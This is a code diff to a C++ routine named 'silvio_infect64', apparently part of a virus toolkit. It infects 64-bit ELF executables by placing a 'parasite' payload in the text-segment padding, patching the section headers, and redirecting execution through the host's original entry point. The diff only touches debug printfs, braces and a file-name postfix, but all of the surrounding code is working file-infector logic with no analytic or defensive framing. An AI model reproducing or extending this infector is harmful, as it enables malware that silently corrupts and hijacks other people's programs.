@@ -160,19 +160,15 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
   return false;
 }
 
-__asm__(
-  ".section .text\n"
-  "_postfix:   .string  \".bak\""
-);
-
 }  // namespace
 
 bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                      vt::common::Mmap<PROT_READ> parasite_mapping) {
   const Elf64_Ehdr* host_header =
       reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  if (host_header->e_type == ET_REL || host_header->e_type == ET_CORE)
+  if (host_header->e_type == ET_REL || host_header->e_type == ET_CORE) {
     return false;
+  }
   if (host_header->e_ident[EI_CLASS] == ELFCLASS32) {
     return false;
   }
@@ -186,7 +182,7 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   }
 
   if (info.padding_size < parasite_mapping.size()) {
-    // printf("[+] Host cannot accomodate parasite\n");
+    printf("[+] Host cannot accomodate parasite\n");
     return false;
   }
 
@@ -196,7 +192,7 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Patch section header table to increase text section size
   if (!patch_sht(host_mapping, parasite_mapping.size(),
                  info.code_segment_end_offset)) {
-    // printf("Failed to patch section header table\n");
+    printf("Failed to patch section header table\n");
     return false;
   }
 
@@ -211,7 +207,7 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   if (!vt::common::patch<Elf64_Addr>(
           host_mapping.mutable_base() + info.parasite_offset,
           parasite_mapping.size(), 0xAAAAAAAAAAAAAAAA, original_entry_point)) {
-    // printf("Failed to patch parasite pattern\n");
+     printf("Failed to patch parasite pattern\n");
     return false;
   }
   return true;
@@ -231,7 +227,7 @@ bool silvio_infect64(const char* host_path, const char* parasite_path) {
   common::String tmp(host_path);
 
   const char postfix = '.';
-  tmp += &postfix;
+  tmp += postfix;
   vt::common::FileDescriptor output(tmp.c_str(), O_RDWR | O_CREAT, S_IRWXU);
 
   if (!output.valid()) {
@@ -255,7 +251,6 @@ bool silvio_infect64(const char* host_path, const char* parasite_path) {
                        vt::move(parasite_mapping))) {
     return false;
   }
-
   struct stat s;
   if (fstat(host.handle(), &s) < 0) {
     return false;
